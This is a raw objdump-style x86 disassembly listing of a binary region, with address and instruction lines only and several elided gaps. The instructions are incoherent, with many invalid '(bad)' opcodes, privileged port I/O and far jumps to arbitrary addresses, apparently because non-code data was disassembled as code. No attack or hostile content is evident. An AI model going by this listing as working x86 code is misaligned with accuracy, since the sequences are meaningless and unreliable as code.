  42213e:	sub    BYTE PTR [edi],al
  422140:	cmp    ebp,DWORD PTR [eax+0x9]
  422143:	repnz les eax,FWORD PTR [eax]
  422146:	call   0xeaffddba
  42214b:	mov    dl,0x85
  42214d:	out    dx,al
  42214e:	mov    al,0x1f
  422150:	mov    bh,BYTE PTR [ebp+0x21]
  422153:	push   0xcbc32f3f
  422158:	dec    esp
  422159:	ror    dl,cl
  42215b:	push   ebp
  42215c:	call   0x4175:0xbad4d7b3
  422163:	inc    esp
  422164:	psubsb mm3,QWORD PTR [ecx-0x68]
  422168:	dec    eax
  422169:	es pop edi
  42216b:	add    DWORD PTR [edi],eax
	...
  4221d5:	add    BYTE PTR [esi-0x284ae],ah
  4221db:	std    
  4221dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4221dd:	pop    ebx
  4221de:	dec    edx
  4221df:	sub    al,0x42
  4221e1:	sub    ebx,ecx
  4221e3:	sub    al,0xd4
  4221e5:	stos   BYTE PTR es:[edi],al
  4221e6:	shr    BYTE PTR [ebp+0x1],1
  4221e9:	add    bh,bh
  4221eb:	add    BYTE PTR [eax],al
  4221ed:	add    BYTE PTR [edi+edi*4-0x55],cl
  4221f1:	dec    DWORD PTR ds:0xec600a47
  4221f7:	fimul  DWORD PTR [edx-0x1a9cc512]
  4221fd:	inc    ecx
  4221fe:	out    0x7a,eax
  422200:	aad    0x99
  422202:	cmp    bh,BYTE PTR [edi]
  422204:	sbb    DWORD PTR [ecx+eiz*8],eax
  422207:	retf   
  422208:	fucomi st,st(0)
  42220a:	iret   
  42220b:	in     eax,0xeb
  42220d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42220e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42220f:	leave  
  422210:	xchg   ecx,eax
  422211:	test   eax,0x1ce50b53
  422216:	jns    0x4221d8
  422218:	add    bh,ah
  42221a:	sub    al,0xad
  42221c:	or     DWORD PTR [esi-0x6a972c3],edx
  422222:	lods   eax,DWORD PTR ds:[esi]
  422223:	jne    0x422245
  422225:	jo     0x422285
  422227:	sahf   
  422228:	pop    eax
  422229:	cmp    eax,0xd570c919
  42222e:	cwde   
  42222f:	inc    ecx
  422230:	jmp    0x4222a9
  422232:	push   edx
  422233:	sti    
  422234:	in     al,dx
  422235:	ret    0x7e17
  422238:	jge    0x4221c9
  42223a:	mov    ebp,DWORD PTR [ebx+0x458e4de1]
  422240:	in     eax,dx
  422241:	scas   eax,DWORD PTR es:[edi]
  422242:	bswap  ebp
  422244:	xlat   BYTE PTR ds:[ebx]
  422245:	je     0x4221d4
  422247:	lds    ebp,FWORD PTR [edi-0x4a2c8b72]
  42224d:	adc    ebx,DWORD PTR [eax+eax*4+0x38e3f9d0]
  422254:	add    DWORD PTR [ebx+0x4c35e80f],esi
  42225a:	clc    
  42225b:	int    0xff
  42225d:	lea    edx,ds:0x3ab30c59
  422263:	lods   al,BYTE PTR ds:[esi]
  422264:	mov    DWORD PTR [ebx-0x75],ebp
  422267:	sub    eax,0xfdaec00f
  42226c:	pop    esp
  42226d:	push   cs
  42226e:	sbb    DWORD PTR [edi-0x30],ebx
  422271:	or     esp,DWORD PTR [eax+0x5f18fe7b]
  422277:	mov    edx,0x25443fb2
  42227c:	jp     0x4222d4
  42227e:	fisubr DWORD PTR [ebp+edx*1-0x42d8a71a]
  422285:	add    esi,DWORD PTR [edx-0x5e08b07f]
  42228b:	adc    dl,BYTE PTR [esi]
  42228d:	int    0xd2
  42228f:	xor    al,0x87
  422291:	xchg   edx,eax
  422292:	mov    ds:0x1904bc4f,al
  422297:	(bad)  
  422298:	sub    cl,BYTE PTR [esi]
  42229a:	or     al,0xed
  42229c:	cmp    esi,DWORD PTR [edx]
  42229e:	inc    edx
  42229f:	mov    ch,0x73
  4222a1:	xor    eax,0x1ae2c180
  4222a6:	aad    0x1c
  4222a8:	dec    edi
  4222a9:	push   cs
  4222aa:	adc    dh,BYTE PTR [esi+eax*4-0x59]
  4222ae:	and    bh,BYTE PTR [edi+edi*4+0x58]
  4222b2:	inc    esi
  4222b3:	call   0xba98:0xd9d5ff63
  4222ba:	fcmovnb st,st(0)
  4222bc:	add    al,0x22
  4222be:	mov    ds:0xe6b9f5f6,eax
  4222c3:	lods   al,BYTE PTR ss:[esi]
  4222c5:	fsub   st(3),st
  4222c7:	aad    0x4f
  4222c9:	repnz mov ebx,0x883a6f2c
  4222cf:	xchg   esp,eax
  4222d0:	aad    0x61
  4222d2:	(bad)  
  4222d4:	cmp    bh,BYTE PTR [ecx-0x260f4325]
  4222da:	aaa    
  4222db:	sbb    edi,edx
  4222dd:	ins    DWORD PTR es:[edi],dx
  4222de:	mov    dl,0x37
  4222e0:	bound  edi,QWORD PTR [ecx-0x44]
  4222e3:	pop    edi
  4222e4:	dec    esp
  4222e5:	sbb    DWORD PTR [ecx-0x61c0c167],ebp
  4222eb:	ja     0x422303
	...
  422355:	add    BYTE PTR [edi-0x10085213],cl
  42235b:	neg    edi
  42235d:	std    
  42235e:	sub    ebx,DWORD PTR [ebp+0x71]
  422361:	dec    ecx
  422362:	or     al,0xa7
  422364:	fwait
  422365:	stc    
  422366:	iret   
  422367:	outs   dx,BYTE PTR ds:[esi]
  422368:	add    DWORD PTR [eax],eax
  42236a:	inc    DWORD PTR [eax]
  42236c:	add    BYTE PTR [eax],al
  42236e:	pop    edx
  42236f:	add    BYTE PTR [eax-0x5b168cee],ch
  422375:	xor    ebx,DWORD PTR [edx-0x54]
  422378:	sub    al,0x9e
  42237a:	cmc    
  42237b:	push   0xe35bd2e7
  422380:	mov    ecx,0xb4e379b9
  422385:	test   eax,0x8281f92d
  42238a:	xchg   bl,ch
  42238c:	sub    cl,BYTE PTR [ebp-0xc50476a]
  422392:	sub    al,0xf2
  422394:	lock (bad) 
  422396:	lar    ecx,WORD PTR [ecx-0x3fe44ba4]
  42239d:	test   edi,0xbcfee576
  4223a3:	ret    0x5da6
  4223a6:	jae    0x4223da
  4223a8:	(bad)  
  4223a9:	jne    0x42240d
  4223ab:	jle    0x422384
  4223ad:	jg     0x422415
  4223af:	cmc    
  4223b0:	pop    eax
  4223b1:	push   esi
  4223b2:	or     eax,0xa097fd71
  4223b7:	add    eax,DWORD PTR [ecx+0x49]
  4223ba:	sahf   
  4223bb:	and    ecx,DWORD PTR [esi-0x4d]
  4223be:	sub    al,0x46
  4223c0:	je     0x422357
  4223c2:	pop    edi
  4223c3:	mov    ecx,0x3b09da79
  4223c8:	fsubr  st(2),st
  4223ca:	je     0x422417
  4223cc:	or     dl,BYTE PTR [ecx]
  4223ce:	stos   DWORD PTR es:[edi],eax
  4223cf:	imul   edx,DWORD PTR [ebp-0x33],0xffffffc8
  4223d3:	pop    ebx
  4223d4:	psubsw mm5,QWORD PTR [ecx-0x24]
  4223d8:	loopne 0x4223f5
  4223da:	jecxz  0x422382
  4223dc:	jmp    0x1ee56783
  4223e1:	mov    al,BYTE PTR [edi+0x5b3ba5b]
  4223e7:	test   DWORD PTR [edx+0xad429b0],0x650c22f1
  4223f1:	sub    BYTE PTR [eax+0x40c91c7e],dl
  4223f7:	sbb    BYTE PTR [eax],dh
  4223f9:	dec    edx
  4223fa:	retf   
  4223fb:	dec    edx
  4223fc:	inc    ebx
  4223fd:	repz mov ch,0x50
  422400:	aad    0xbc
  422402:	loop   0x422426
  422404:	div    DWORD PTR [ecx+0x78]
  422407:	popa   
  422408:	jmp    0x47c365e3
  42240d:	(bad)  
  42240e:	pop    eax
  42240f:	xchg   ebx,eax
  422410:	rol    BYTE PTR [edi],0xf2
  422413:	cmc    
  422414:	shr    dl,0xf3
  422417:	adc    ecx,DWORD PTR [ecx]
  422419:	aad    0xcd
  42241b:	inc    edx
  42241c:	add    ebp,ecx
  42241e:	jp     0x422414
  422420:	rcl    cl,0xa
  422423:	push   cs
  422424:	mov    ebx,0xa1275760
  422429:	scas   eax,DWORD PTR es:[edi]
  42242a:	dec    ebx
  42242b:	bnd jg 0x422464
  42242e:	ds call 0x392b2ff9
  422434:	test   BYTE PTR [edi+0x7a1572b7],0x38
  42243b:	or     ebx,0x27217128
  422441:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422442:	mov    eax,ds:0x31d6ec58
  422447:	lods   eax,DWORD PTR ds:[esi]
  422448:	mov    eax,ds:0xc2847eaf
  42244d:	fsubr  DWORD PTR [ebp+0x30]
  422450:	mov    ebx,0x6b3cc14d
  422455:	cmp    eax,0x7c59b0d7
  42245a:	pushf  
  42245b:	clc    
  42245c:	ret    
  42245d:	jns    0x422479
  42245f:	aas    
  422460:	sbb    BYTE PTR [eax+0x20],bl
  422463:	pop    ecx
  422464:	add    DWORD PTR [eax+0x1d22c5d7],ebx
  42246a:	test   eax,ebx
  42246c:	lock add BYTE PTR [eax],al
	...
  4224d3:	add    BYTE PTR [eax],al
  4224d5:	add    BYTE PTR [edx-0x7e],dl
  4224d8:	cs imul edi,esi,0xbbbb57ed
  4224df:	xor    ebp,esp
  4224e1:	cdq    
  4224e2:	daa    
  4224e3:	mov    ebx,0x6fce3bf8
  4224e8:	add    DWORD PTR [eax],eax
  4224ea:	inc    DWORD PTR [eax]
  4224ec:	add    BYTE PTR [eax],al
  4224ee:	sbb    eax,0x715d7d64
  4224f3:	mov    eax,ds:0xff863328
  4224f8:	add    cl,ch
  4224fa:	mov    edx,0xf20693c4
  4224ff:	or     al,0xc0
  422501:	loop   0x422542
  422503:	adc    BYTE PTR [esi+0x5407a2d8],0xda
  42250a:	push   esp
  42250b:	xchg   ebx,eax
  42250c:	dec    ebp
  42250d:	aas    
  42250e:	ficom  WORD PTR gs:[ebx-0x41]
  422512:	scas   eax,DWORD PTR es:[edi]
  422513:	push   es
  422514:	jns    0x4224e7
  422516:	mov    eax,0x6e63d7a3
  42251b:	(bad)
  42251e:	pop    eax
  42251f:	fwait
  422520:	sbb    edi,edi
  422522:	dec    ecx
  422523:	and    cl,BYTE PTR [ebx-0x72]
  422526:	(bad)  
  422528:	int3   
  422529:	repnz add ecx,DWORD PTR [ebx-0x34]
  42252d:	(bad)
  422530:	dec    eax
  422531:	jg     0x4224e2
  422533:	sar    BYTE PTR [edx+0x1c5f2a7d],1
  422539:	jl     0x422583
  42253b:	sbb    ch,BYTE PTR [ecx+edx*4]
  42253e:	cmp    BYTE PTR [edi-0x33],ch
  422541:	pop    ebp
  422542:	mov    eax,ebx
  422544:	les    ebp,FWORD PTR [edx+0x1f]
  422547:	in     al,dx
  422548:	popf   
  422549:	push   0x10f3240
  42254e:	and    al,0x1b
  422550:	arpl   WORD PTR [ecx+0x73],sp
  422553:	aam    0x26
  422555:	sbb    DWORD PTR [edx-0x1d486e81],esp
  42255b:	stc    
  42255c:	(bad)  
  42255d:	fcmovu st,st(2)
  42255f:	mov    eax,ss:0x7da18a3a
  422565:	xchg   ebp,eax
  422566:	inc    esp
  422567:	and    al,0xf9
  422569:	(bad)  
  42256a:	shl    BYTE PTR [eax-0x268f87fb],0x6b
  422571:	mov    dl,dh
  422573:	mov    bh,0x22
  422575:	and    eax,0xb0aca25a
  42257a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42257b:	cld    
  42257c:	ficomp WORD PTR [eax-0x47]
  42257f:	jbe    0x4225e3
  422581:	lods   eax,DWORD PTR ds:[esi]
  422582:	sbb    DWORD PTR [ecx-0x7d],0x2f9daee4
  422589:	int    0xb1
  42258b:	call   0xfd3e:0xca40d3c5
  422592:	aam    0xef
  422594:	fst    QWORD PTR [edx]
  422596:	ins    BYTE PTR es:[edi],dx
  422597:	das    
  422598:	into   
  422599:	(bad)  
  42259a:	or     cl,bh
  42259c:	loopne 0x42252b
  42259e:	repnz gs pop edi
  4225a1:	cmc    
  4225a2:	sahf   
  4225a3:	jo     0x4225b5
  4225a5:	jo     0x422571
  4225a7:	and    eax,0x9d7f4089
  4225ac:	inc    ecx
  4225ad:	and    eax,0xc7f442f4
  4225b2:	pop    eax
  4225b3:	inc    ecx
  4225b4:	xchg   DWORD PTR [edx],esp
  4225b6:	cli    
  4225b7:	add    ebp,esi
  4225b9:	sub    dh,BYTE PTR [ebx+0x6ce93ebe]
  4225bf:	das    
  4225c0:	in     eax,dx
  4225c1:	adc    BYTE PTR [ebx+esi*1-0x77],0x4
  4225c6:	das    
  4225c7:	in     al,dx
  4225c8:	mov    eax,ds:0x97751007
  4225cd:	add    eax,0xcf943c2d
  4225d2:	cli    
  4225d3:	rol    DWORD PTR [ecx+0x46683980],0x9f
  4225da:	add    eax,0x81bdef7c
  4225df:	sbb    cl,dh
  4225e1:	mov    eax,DWORD PTR [eax-0x59]
  4225e4:	ja     0x422609
  4225e6:	and    DWORD PTR [edx-0x73b51445],esp
  4225ec:	lahf   
	...
  422655:	add    BYTE PTR [edx-0x40887052],bl
  42265b:	ja     0x422657
  42265d:	out    dx,eax
  42265e:	sbb    esi,DWORD PTR [ecx+0x7cf4a2f8]
  422664:	xchg   edi,eax
  422665:	(bad)  
  422667:	jo     0x42266a
  422669:	add    bh,bh
  42266b:	add    BYTE PTR [eax],al
  42266d:	add    ah,al
  42266f:	xchg   edx,eax
  422670:	cs cmp al,0x97
  422673:	dec    esp
  422674:	sbb    al,0x2c
  422676:	repz inc ebx
  422678:	mov    esp,0xe04ff935
  42267d:	mov    dl,0x5d
  42267f:	test   al,0x39
  422681:	push   ecx
  422682:	cmp    ch,BYTE PTR [ebx]
  422684:	fwait
  422685:	sub    edi,DWORD PTR [ebx+0x1e]
  422688:	retf   
  422689:	dec    BYTE PTR [esp+eax*1+0x5a338a14]
  422690:	fsub   QWORD PTR [ebx+0x79b9cb82]
  422696:	add    DWORD PTR [eax-0x127a42d7],esi
  42269c:	lahf   
  42269d:	cli    
  42269e:	jmp    0x752:0x451c6bce
  4226a5:	and    bh,BYTE PTR ds:0x60d63547
  4226ab:	sbb    DWORD PTR ds:0x62582737,0xfffffffb
  4226b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4226b4:	test   esi,0x89f82748
  4226ba:	call   0x99bd0720
  4226bf:	ret    0x84de
  4226c2:	pop    esp
  4226c3:	shl    DWORD PTR [eax-0x6a8e0dd7],cl
  4226c9:	out    0xa3,al
  4226cb:	inc    edi
  4226cc:	adc    eax,0x99daa632
  4226d1:	les    edx,FWORD PTR [ecx+0x2e0558a4]
  4226d7:	mov    ebx,0xc32745c8
  4226dc:	pop    ebp
  4226dd:	mov    esp,0x79f6e184
  4226e2:	pop    eax
  4226e3:	sbb    eax,DWORD PTR [ebx-0x2db2b1e2]
  4226e9:	std    
  4226ea:	es mov edi,0x47dbbec6
  4226f0:	inc    esp
  4226f1:	sub    dl,BYTE PTR [edx+ebx*4+0x3e]
  4226f5:	xchg   esp,eax
  4226f6:	xlat   BYTE PTR ds:[ebx]
  4226f7:	pop    ebp
  4226f8:	test   BYTE PTR [ebx+ebx*2+0x376822b5],bl
  4226ff:	jno    0x4226f1
  422701:	mov    ds:0xbb1b1f29,eax
  422706:	push   ebx
  422707:	sub    eax,0x69518e3c
  42270c:	mov    cl,dl
  42270e:	test   BYTE PTR [edi+edx*2],dh
  422711:	aad    0x44
  422713:	adc    DWORD PTR [edi+0x65c52ead],ecx
  422719:	and    edi,DWORD PTR [eax-0x277911b8]
  42271f:	jb     0x4226ce
  422721:	scas   al,BYTE PTR es:[edi]
  422722:	and    BYTE PTR [ebx+0x74],ah
  422725:	rcr    DWORD PTR [eax+edi*4+0x2a6ee952],cl
  42272c:	(bad)
  422731:	push   ebx
  422732:	data16 adc BYTE PTR [ecx+0x193132df],ch
  422739:	(bad)
  42273d:	xlat   BYTE PTR ds:[ebx]
  42273e:	pusha  
  42273f:	push   es
  422740:	add    DWORD PTR [eax],0xffffffbf
  422743:	lock lods al,BYTE PTR ds:[esi]
  422745:	jle    0x4227b3
  422747:	mov    gs,ecx
  422749:	mov    al,ds:0x4e08b2be
  42274e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42274f:	sbb    DWORD PTR [edi+ecx*4-0x50219555],ebp
  422756:	xor    eax,0x7c30444a
  42275b:	mov    gs,WORD PTR [ebp-0x2ac4986d]
  422761:	lds    esi,FWORD PTR [ebx]
  422763:	into   
  422764:	pop    edi
  422765:	idiv   DWORD PTR [edi+0x18264fd4]
  42276b:	stc    
  42276c:	cli    
	...
  4227d5:	add    BYTE PTR [edi],ah
  4227d7:	sub    eax,0x7d7f2d7d
  4227dc:	ja     0x42280d
  4227de:	mov    esi,0xfa7f01c8
  4227e3:	cld    
  4227e4:	aas    
  4227e5:	mov    eax,0x171cc
  4227ea:	inc    DWORD PTR [eax]
  4227ec:	add    BYTE PTR [eax],al
  4227ee:	stos   BYTE PTR es:[edi],al
  4227ef:	xor    al,0xf9
  4227f1:	xor    BYTE PTR [ecx-0x24a09f5d],bh
  4227f7:	and    bh,dl
  4227f9:	pusha  
  4227fa:	out    0x9b,eax
  4227fc:	sbb    esp,0xffffff82
  4227ff:	jno    0x4227f3
  422801:	cmp    al,ch
  422803:	inc    ebx
  422804:	push   0x42
  422806:	arpl   WORD PTR [eax-0x71],di
  422809:	adc    al,0x79
  42280c:	push   es
  42280d:	fisub  WORD PTR [ebx-0x7939fda6]
  422813:	(bad)  
  422814:	and    cl,BYTE PTR ds:0xcabf3ef4
  42281a:	and    DWORD PTR [ebx+0x31e91c44],esp
  422820:	xor    edx,ebx
  422822:	scas   al,BYTE PTR es:[edi]
  422823:	sbb    al,0xa7
  422825:	repz inc esi
  422827:	je     0x4227f6
  422829:	imul   esi,DWORD PTR [eax+0x1e],0xee590027
  422830:	sub    eax,DWORD PTR [edx+eax*8+0x4f]
  422834:	push   eax
  422835:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422836:	cmp    al,0x1
  422838:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422839:	jo     0x422855
  42283b:	or     bh,BYTE PTR [ebx-0x43bea1fc]
  422841:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422842:	pusha  
  422843:	int3   
  422844:	je     0x422848
  422846:	ds cwde 
  422848:	inc    ecx
  422849:	jns    0x422849
  42284b:	or     ah,bl
  42284d:	ins    BYTE PTR es:[edi],dx
  42284e:	adc    BYTE PTR [edx-0x20b1e019],bl
  422854:	ins    DWORD PTR es:[edi],dx
  422855:	retf   
  422856:	mov    dh,0x32
  422858:	(bad)  
  42285a:	inc    ebp
  42285b:	ds and edi,ecx
  42285e:	push   0xffffffe5
  422860:	xchg   BYTE PTR [ecx+eiz*1],bh
  422863:	mov    esp,0xcb520f49
  422868:	adc    bh,BYTE PTR [eax+0x7923a36a]
  42286e:	dec    edx
  42286f:	jl     0x422882
  422871:	mov    dh,0x37
  422873:	cmp    ch,BYTE PTR [eax+ebp*1+0x7d]
  422877:	repnz fwait
  422879:	dec    esi
  42287a:	fs es call 0x1abb:0x9cbceec7
  422883:	dec    edx
  422884:	in     eax,dx
  422885:	repz xchg bh,ah
  422888:	retf   0xfd3c
  42288b:	fwait
  42288c:	mov    al,ds:0x3632986a
  422891:	and    BYTE PTR ds:0x68c5e2c,0xbb
  422898:	int    0x4b
  42289a:	mov    ecx,0x6d1d5bcc
  42289f:	and    eax,DWORD PTR [esi+0x79]
  4228a2:	and    al,0x26
  4228a4:	ss ins DWORD PTR es:[edi],dx
  4228a6:	ja     0x4228f5
  4228a8:	call   0xb8c3:0xd72936da
  4228af:	jmp    0x422842
  4228b1:	in     al,dx
  4228b2:	push   esi
  4228b3:	mov    esi,0x9bbf7911
  4228b8:	jmp    DWORD PTR [edi-0x58]
  4228bb:	mov    dl,0xfc
  4228bd:	rol    ebp,cl
  4228bf:	lods   al,BYTE PTR ds:[esi]
  4228c0:	xchg   dl,al
  4228c2:	aas    
  4228c3:	enter  0xe36b,0x3b
  4228c7:	mov    al,0xc4
  4228c9:	adc    ah,BYTE PTR [eax+0x54ebe9da]
  4228cf:	mov    dh,0xdb
  4228d1:	in     al,dx
  4228d2:	mov    BYTE PTR [edi-0x2],dl
  4228d5:	js     0x4228d0
  4228d7:	shr    BYTE PTR [esi-0x79485c78],0x31
  4228de:	cli    
  4228df:	in     eax,dx
  4228e0:	stos   DWORD PTR es:[edi],eax
  4228e1:	push   ss
  4228e2:	lods   al,BYTE PTR ss:[esi]
  4228e4:	sub    ch,BYTE PTR [ebx+0x5f]
  4228e7:	scas   eax,DWORD PTR es:[edi]
  4228e8:	in     eax,dx
  4228e9:	cmp    eax,0xce58b
	...
  422956:	int    0x39
  422958:	mov    eax,0xef97fc97
  42295d:	jnp    0x42291d
  42295f:	outs   dx,DWORD PTR ds:[esi]
  422960:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422961:	loopne 0x42290f
  422963:	xor    eax,0x72cbb5c6
  422968:	add    DWORD PTR [eax],eax
  42296a:	inc    DWORD PTR [eax]
  42296c:	add    BYTE PTR [eax],al
  42296e:	dec    ecx
  42296f:	ss jg  0x4229a7
  422972:	int    0xd
  422974:	retf   0xe273
  422977:	cmp    DWORD PTR [ebx],ebx
  422979:	rcl    DWORD PTR [edi+0x14dc5fa8],1
  42297f:	fsubr  DWORD PTR [esi+ecx*4-0x1682d234]
  422986:	pop    esp
  422987:	sub    al,0x53
  422989:	sbb    al,0x41
  42298b:	cmp    DWORD PTR [edx-0x752997fe],0xbf054978
  422995:	xor    BYTE PTR [ebp-0x19044dae],ah
  42299b:	xchg   ebx,eax
  42299c:	xor    eax,0x1c8cd13a
  4229a1:	xchg   ecx,eax
  4229a2:	add    al,0xc
  4229a4:	jmp    0x7372:0xb8556a92
  4229ab:	pushf  
  4229ac:	cs sahf 
  4229ae:	xchg   dh,cl
  4229b0:	jmp    0x567a2ac2
  4229b5:	in     eax,0xc6
  4229b7:	fsubr  DWORD PTR ss:[ecx]
  4229ba:	sbb    ah,BYTE PTR [ecx]
  4229bc:	xchg   DWORD PTR [ecx],esi
  4229be:	mov    ecx,0xa0ad871b
  4229c3:	jo     0x42295d
  4229c5:	retf   0x7ffa
  4229c8:	jmp    0x6ef3a020
  4229cd:	adc    al,0x46
  4229cf:	out    0xcf,eax
  4229d1:	or     eax,0x3caf5506
  4229d6:	rol    DWORD PTR [edi+ebp*8-0x50],0x84
  4229db:	pop    ecx
  4229dc:	(bad)  
  4229dd:	xchg   esp,eax
  4229de:	lods   al,BYTE PTR ss:[esi]
  4229e0:	and    eax,esi
  4229e2:	inc    edx
  4229e3:	push   cs
  4229e4:	adc    DWORD PTR [ecx+0x5d],edx
  4229e7:	cli    
  4229e8:	xchg   edi,eax
  4229e9:	iret   
  4229ea:	cdq    
  4229eb:	dec    ebx
  4229ec:	(bad)  
  4229ed:	loope  0x4229a1
  4229ef:	test   eax,0xa4d5bfa7
  4229f4:	add    BYTE PTR [ecx+eax*8],dl
  4229f7:	lahf   
  4229f8:	pop    ebx
  4229f9:	pop    ds
  4229fa:	test   DWORD PTR [edi+ebp*8-0x7],esi
  4229fe:	xlat   BYTE PTR ds:[ebx]
  4229ff:	je     0x4229d8
  422a01:	icebp  
  422a02:	ja     0x422a38
  422a04:	cmp    edx,edx
  422a06:	mov    eax,cs
  422a08:	jae    0x4229cb
  422a0a:	adc    al,0x61
  422a0c:	cmp    BYTE PTR [edx-0x4fbd9808],cl
  422a12:	sbb    BYTE PTR [esi+0x2],0x2b
  422a16:	js     0x4229a5
  422a18:	fs jbe 0x422a58
  422a1b:	ror    BYTE PTR [ebp+0x5],cl
  422a1e:	in     eax,dx
  422a1f:	xor    bl,BYTE PTR ds:0xe6d30037
  422a25:	ss mov dh,0xb5
  422a28:	lahf   
  422a29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422a2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422a2b:	sbb    BYTE PTR [ecx+0x62f0377e],ah
  422a31:	jle    0x422a2b
  422a33:	push   ebp
  422a34:	inc    edx
  422a35:	xor    eax,0x6d1b1424
  422a3a:	push   0xe63798cc
  422a3f:	mov    ebx,DWORD PTR [eax]
  422a41:	dec    eax
  422a42:	mov    bh,BYTE PTR [eax-0x517c4109]
  422a48:	(bad)  
  422a49:	out    dx,eax
  422a4a:	xor    eax,0xdb062343
  422a4f:	push   ss
  422a50:	push   es
  422a51:	jb     0x422abc
  422a53:	je     0x422a50
  422a55:	sbb    BYTE PTR [ecx],ch
  422a57:	push   cs
  422a58:	stos   BYTE PTR es:[edi],al
  422a59:	mov    bh,BYTE PTR [esi+0x137f661a]
  422a5f:	jbe    0x422ab9
  422a61:	lea    eax,[ebx-0x4480075a]
  422a67:	push   ds
  422a68:	pusha  
  422a69:	and    dh,BYTE PTR [edx]
  422a6b:	sbb    BYTE PTR [ebx+0x0],ah
	...
  422ad6:	xchg   esi,eax
  422ad7:	push   0x18
  422ad9:	mov    ah,bh
  422adb:	cli    
  422adc:	xchg   esi,eax
  422add:	jle    0x422ab0
  422adf:	push   esp
  422ae0:	je     0x422a9f
  422ae2:	xchg   edi,eax
  422ae3:	pop    es
  422ae4:	mov    ds,edi
  422ae6:	retf   0x173
  422ae9:	add    bh,bh
  422aeb:	add    BYTE PTR [eax],al
  422aed:	add    BYTE PTR [eax],bh
  422aef:	cld    
  422af0:	push   ds
  422af1:	jo     0x422b2a
  422af3:	loopne 0x422aa0
  422af5:	imul   edi,DWORD PTR [edi-0x546b2f0e],0xebf36784
  422aff:	pop    eax
  422b00:	outs   dx,BYTE PTR ds:[esi]
  422b01:	inc    ebp
  422b02:	dec    eax
  422b03:	jbe    0x422a88
  422b05:	adc    edx,ebp
  422b07:	mov    bl,0x77
  422b09:	leave  
  422b0a:	mov    al,ds:0xe104aa13
  422b0f:	stos   DWORD PTR es:[edi],eax
  422b10:	push   cs
  422b11:	leave  
  422b12:	div    BYTE PTR [edx-0x7857a4ab]
  422b18:	add    DWORD PTR [eax+0x48],esp
  422b1b:	pop    eax
  422b1c:	test   ebx,esi
  422b1e:	pop    edx
  422b1f:	mov    ss,esp
  422b21:	pop    ebx
  422b22:	(bad)  
  422b23:	mov    al,ds:0xc177a125
  422b28:	pop    edx
  422b29:	sub    DWORD PTR [eax-0x2e],ebx
  422b2c:	hlt    
  422b2d:	xchg   DWORD PTR ds:0xec91dbfe,eax
  422b33:	ret    
  422b34:	xor    eax,0xb4a966c4
  422b39:	xchg   esp,eax
  422b3a:	xchg   ebp,eax
  422b3b:	mov    ds:0xaabf6c4a,eax
  422b40:	mov    eax,0x72cdcd18
  422b45:	dec    esp
  422b46:	sub    DWORD PTR [edx+0x4c0782c7],ebx
  422b4c:	cmp    eax,0xd837099b
  422b51:	xlat   BYTE PTR ds:[ebx]
  422b52:	jb     0x422b25
  422b54:	scas   al,BYTE PTR es:[edi]
  422b55:	adc    al,0x62
  422b57:	imul   bh
  422b59:	and    al,0xe6
  422b5b:	sbb    ebp,DWORD PTR [eax-0x53]
  422b5e:	cmp    DWORD PTR [eax],ecx
  422b60:	xchg   esi,eax
  422b61:	rdpmc  
  422b63:	mov    esp,DWORD PTR [ecx+0x32]
  422b66:	and    al,0xa8
  422b68:	es cdq 
  422b6a:	pop    ecx
  422b6b:	mov    eax,0x4c633fac
  422b70:	shr    BYTE PTR [ebx+0x75],0xaa
  422b74:	or     ah,BYTE PTR [edi]
  422b76:	bound  ebx,QWORD PTR [edi+0x59]
  422b79:	ss mov dl,0x89
  422b7c:	add    DWORD PTR [edi-0x1f0b2fa3],ebx
  422b82:	dec    edx
  422b83:	and    cl,BYTE PTR [esi-0x5121294d]
  422b89:	dec    esi
  422b8a:	in     al,0x90
  422b8c:	cmp    dl,cl
  422b8e:	sahf   
  422b8f:	mov    esi,0x2495411e
  422b94:	pop    edx
  422b95:	inc    edi
  422b96:	gs sbb eax,0xc92593e8
  422b9c:	xchg   ecx,eax
  422b9d:	loopne 0x422c18
  422b9f:	xchg   esp,eax
  422ba0:	cmc    
  422ba1:	in     al,0xa2
  422ba3:	out    dx,al
  422ba4:	push   es
  422ba5:	sti    
  422ba6:	test   edi,edi
  422ba8:	into   
  422ba9:	icebp  
  422baa:	in     al,0x6b
  422bac:	nop
  422bad:	mov    cl,0x93
  422baf:	jne    0x422c0a
  422bb1:	addr16 mov dl,0xe1
  422bb4:	ror    DWORD PTR [edx+0x3bc752c7],cl
  422bba:	cmp    BYTE PTR [eax],bh
  422bbc:	adc    ch,BYTE PTR [esi-0x39]
  422bbf:	push   eax
  422bc0:	jp     0x422b64
  422bc2:	push   es
  422bc3:	mov    ch,0x17
  422bc5:	fwait
  422bc6:	das    
  422bc7:	fsubr  st,st(5)
  422bc9:	iret   
  422bca:	and    DWORD PTR [edx+0x5f51fde6],0x953728c
  422bd4:	(bad)  
  422bd6:	xlat   BYTE PTR ds:[ebx]
  422bd7:	dec    BYTE PTR [esi-0x2abd3a1c]
  422bdd:	push   0x8ca29990
  422be2:	jg     0x422bbf
  422be4:	push   ss
  422be5:	ds (bad) 
  422be7:	jae    0x422bf6
  422be9:	ret    0xe6cd
  422bec:	mov    bh,0x0
	...
  422c56:	inc    esp
  422c57:	aaa    
  422c58:	dec    edx
  422c59:	fwait
  422c5a:	jnp    0x422c5b
  422c5c:	aad    0xff
  422c5e:	sbb    dl,BYTE PTR [edx-0x1d7eb264]
  422c64:	push   0x9
  422c66:	leave  
  422c67:	je     0x422c6a
  422c69:	add    bh,bh
  422c6b:	add    BYTE PTR [eax],al
  422c6d:	add    al,cl
  422c6f:	add    ecx,DWORD PTR [edx+0x7f]
  422c72:	jae    0x422ca4
  422c74:	in     al,dx
  422c75:	pushf  
  422c76:	fldcw  WORD PTR [ebx-0x31]
  422c79:	mov    al,0x26
